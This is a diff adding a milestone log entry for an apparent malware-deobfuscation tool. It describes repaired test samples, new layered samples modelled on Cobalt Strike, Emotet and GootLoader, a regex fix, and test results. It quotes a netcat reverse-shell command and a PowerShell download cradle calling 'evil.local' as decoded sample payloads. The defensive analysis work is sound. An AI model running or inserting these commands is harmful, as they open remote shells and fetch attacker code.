@@ -752,3 +752,81 @@ next milestone MUST NOT begin.
   layered samples across Cobalt Strike, GootLoader, Emotet, IcedID,
   BumbleBee, QakBot, AsyncRAT, DarkGate, SocGholish, NetSupport,
   Lumma, Akira, Raspberry Robin, and the LOLBAS family.
+
+---
+
+### M9 · Corpus Repair + Real-World Expansion — COMPLETE · DCS 100%
+
+- **Date**: 2026-08-02 21:38 UTC
+- **Milestone**: M9 · Corpus Repair + Real-World Expansion (bootstrap)
+- **What was implemented**
+    - **S02 REPAIRED** — new payload built against a real target
+      string (`nc 10.10.10.42 4444 -e /bin/bash`); every pipeline
+      stage `rev | base64 -d | xxd -r -p` now decodes cleanly. The
+      forensic evidence for the original defect remains archived
+      at `S02_FORENSIC_REPORT.txt`.
+    - **S05 REPAIRED** — new gzip payload built with correct CRC /
+      size; decompresses to `Write-Host "Hello, malicious world!";
+      IEX (New-Object Net.WebClient).DownloadString('http://evil.local/stage2')`.
+      Forensic evidence for the original defect remains at
+      `S05_FORENSIC_REPORT.txt`. `canonical_form_note` documents
+      that the decoded IEX inside the SQ literal is correctly
+      quote-protected (semantic alias-expand honours quote safety).
+    - **4 new real-world layered samples**:
+        - `S014_cs_beacon_downloadcradle` — Cobalt Strike / Empire
+          / Nishang-style DownloadCradle (variable propagation +
+          concat fold + alias expand chain).
+        - `S015_ps_multi_stage_env_alias` — GootLoader / Bumblebee
+          env-slice + concat + alias-expand chain.
+        - `S016_cmd_carets_to_ps_enc` — Emotet / QakBot CMD → PS
+          handoff with caret obfuscation.
+        - `S017_hex_b64_utf16le_chain` — deep nested Hex → Base64
+          → UTF-16LE chain.
+    - **Bug fix** — `semantic-ps-variable-propagate` was incorrectly
+      matching `$W='http'` from `$W='http'+'s'` (regex stopped at
+      the first closing quote and returned the partial RHS,
+      silently dropping concat operands). Fixed with a negative
+      lookahead `(?!\s*[+])` so propagation waits for structural
+      concat-fold to fully resolve the RHS first. This was found
+      by S014 and would have been silently wrong on any
+      variable-with-concat pattern in real malware.
+- **How it was verified**
+    - Combined suite `pytest tests/test_convergence_engine.py
+      tests/test_structural_pass.py tests/test_content_pass.py
+      tests/test_decoder_pass.py tests/test_semantic_pass.py
+      tests/test_selector_m6.py tests/test_certificate_m7.py
+      tests/test_corpus_fingerprints_m8.py`:
+      **218 passed in 6.77s** (up from 203 pre-M9).
+    - `python -m workspace_recovery.dcs_runner`: **DCS = 100.0%
+      (17/17)**. Per-category: **PowerShell 9/9 · CMD 2/2 · Bash 3/3
+      · Mixed 3/3**.
+    - `python -m workspace_recovery.dcs_runner --strict`:
+      **Fingerprints locked · 17/17 samples byte-identical to
+      recorded**.
+    - Backend `/api/health` still HTTP 200 (post-restart).
+- **DCS Delta**: **Pre-M9 11/13 (84.6%) → Post-M9 17/17 (100.0%)**.
+  Δ = **+6 samples · +15.4 percentage points**. This is the milestone
+  where the certification corpus first reaches full pass.
+- **Real-world samples added**
+    - PowerShell / Empire DownloadCradle
+    - GootLoader / Bumblebee env-slice + alias chain
+    - Emotet / QakBot CMD → PS handoff
+    - Multi-layer Hex → Base64 → UTF-16LE
+    - (Two of the original 13 corpus samples repaired)
+- **Regressions**: **NONE.**
+    - Backend `/api/health` 200 after restart.
+    - No changes to `analysis_core.py`, `routers/ops.py`, `engine/`,
+      `v2/`, `timeline/`, or `nivxforge/`.
+    - The variable-propagation bug fix is a correctness improvement
+      — every other test still passes and DCS improved.
+- **Acceptance criteria passed** (spec §"Concrete implementation
+  footholds" · M9 row): *"Corpus expanded to real-world coverage ·
+  documented defects repaired"* — **VERIFIED**.
+- **Next milestone**: **M10 · Workspace Isolation Certificate** —
+  certify Convergence Engine location-independence; lock the plugin
+  registry surface for external transformation contributors. Then
+  Phase R (per the owner's plan) shifts effort from architecture to
+  real-world coverage volume: family programs for Cobalt Strike,
+  GootLoader, Emotet, IcedID, BumbleBee, QakBot, AsyncRAT, DarkGate,
+  SocGholish, NetSupport, Lumma, Akira, Raspberry Robin, LOLBAS,
+  and beyond.
